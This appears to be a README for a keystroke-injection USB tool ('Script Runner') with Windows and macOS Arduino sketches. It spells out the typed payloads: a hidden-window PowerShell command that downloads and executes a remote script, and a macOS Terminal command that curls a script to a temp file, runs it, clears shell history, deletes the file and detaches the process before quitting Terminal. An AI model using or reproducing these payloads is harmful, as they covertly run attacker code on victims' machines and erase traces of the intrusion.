# Script Runner
<br>

**script_runner_win.ino:** Once plugged in, it hits win+r which opens the run menu. Then it types out `powershell -w h iex (irm "[url]")`. Here, `-w h` makes it so the process is ran in a hidden window, `irm "[url]"` sends a request to the url and gets the raw text which is then executed by `iex`

<br>

**script_runner_mac.ino:** Once plugged in, it hits cmd+space which opens spotlight. Then it types `Terminal.app` and hits enter to open up the terminal application. Then it types out `"$( curl "[url]" > $TMPDIR/16691615; bash $TMPDIR/16691615; history -c; rm ~/.bash_history;rm $TMPDIR/16691615 )" & disown;`, and then it quits the terminal by hitting command+q and then enter (it hits enter because of the "Do you want to terminate the processes in this window" prompt). Here, `curl "[url]" > $TMPDIR/16691615` saved the script to a file, `bash $TMPDIR/16691615` executed the file, `history -c`, `rm ~/.bash_history`, `rm $TMPDIR/16691615` clear our traces, and `& disown` ensures that these processes keep running even if the terminal is exited
